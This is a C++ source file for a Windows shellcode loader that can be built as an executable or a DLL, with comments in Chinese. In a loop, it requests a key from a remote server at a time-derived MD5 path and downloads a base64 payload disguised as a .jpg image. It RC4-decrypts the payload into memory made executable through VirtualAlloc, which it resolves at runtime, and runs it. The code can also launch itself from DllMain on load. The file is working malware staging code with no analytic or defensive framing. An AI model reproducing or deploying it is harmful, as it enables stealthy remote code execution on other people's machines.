#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include<WinSock2.h>
#include <Ws2tcpip.h>

#include <windows.h>  
#include <string>
#include "b64/base64.h"
#include "Md5/md5.h"
#include <iostream>
#include <time.h>
#include "rc4/ARC4.h"
#include "http/httplib.h"

//#include<direct.h>
//data段可读写  
#pragma comment(linker, "/section:.data,RWE")   
//不显示窗口  
//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
//#pragma comment(linker, "/INCREMENTAL:NO")
typedef PVOID(*M) (DWORD, DWORD, DWORD, DWORD);


char target[MAX_PATH] = "";

httplib::Client cli(target);
#ifndef _WIN64
httplib::Headers headers = {
{ "Accept-platform", "x86" }
};
#else
httplib::Headers headers = {
{ "Accept-platform", "x64" }
};
#endif
const char obscure[] = "asdasjasdnlkasdj[psgdakn[jF*(";
typedef void(__stdcall *CODE) ();
char * shellcode = NULL;
int shellcode_size = 0; 

std::string GenerateUri()
{
	time_t myt = time(NULL);
	int key = int(int(myt) / 100);
	std::string u = string(obscure) + std::to_string(key);
	return "/" + MD5(u).toStr();
}
bool GetShellCodeSize()
{
	
	auto res = cli.Get("/my/get_size",headers);
	if (res->status != 200)return false;
	shellcode_size = std::atoi(res->body.c_str());
	shellcode = (char*)malloc(shellcode_size);
	if (shellcode != 0) {
		return true;
	}
	else {
		return false;
	}
}

std::string GetKey()
{
	if (GetShellCodeSize() == false) {
		return "";
	}
	
	
	auto res = cli.Get(GenerateUri().c_str(),headers);
	if (res->status != 200)return "";
	return res->body;	
}
void LoadShellCode(char *shellcode)
{
	HMODULE hDllLib = LoadLibrary("Kernel32.dll");
	FARPROC fpFun = GetProcAddress(hDllLib, "VirtualAlloc");
	M VirtualAlloc_ = (M)*fpFun;
	
	void* p = NULL;
	p = VirtualAlloc_(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy_s(p, shellcode_size, shellcode, shellcode_size);

	CODE code = (CODE)p;
	code();
	
	
	
}

void DecPayload()
{
	std::string key = GetKey();
	
	if (key == "")return;
	time_t myt = time(NULL);
	int filename = int(int(myt) / 100);
	std::string url = "/" + std::to_string(filename) + ".jpg";
	
	auto res = cli.Get(url.c_str(),headers);
	if (res->status != 200)return;
	std::string body = res->body;
	
	std::string payload = base64_decode(body);
	char * c_payload = (char *)malloc(shellcode_size);
	memcpy_s(c_payload, shellcode_size, payload.c_str(), shellcode_size);
	ARC4 rc4;
	if (key.length() == 0) {
		return;
	}
	rc4.setKey((unsigned char*)key.c_str(), key.length());
	rc4.encrypt(c_payload, shellcode, shellcode_size);

	LoadShellCode(shellcode);
}


extern "C" _declspec(dllexport) void Invoke();
void Invoke()
{
	
	Sleep(2000);
	while (true) {
		try {
			Sleep(2000);
			DecPayload();
		}
		catch (const std::exception& e)
		{
			
		}
		
	}
	return ;

}

int main()
{  

	Invoke();
	return 0;
	
}  
int CALLBACK WinMain(
	_In_  HINSTANCE hInstance,
	_In_  HINSTANCE hPrevInstance,
	_In_  LPSTR lpCmdLine,
	_In_  int nCmdShow
) {
	Invoke();
	return 0;
}
BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		
		break;

	case DLL_PROCESS_DETACH:
		
		break;

	case DLL_THREAD_ATTACH:
		
		break;

	case DLL_THREAD_DETACH:
		
		break;
	}
	
	Invoke();
	return (TRUE);

}
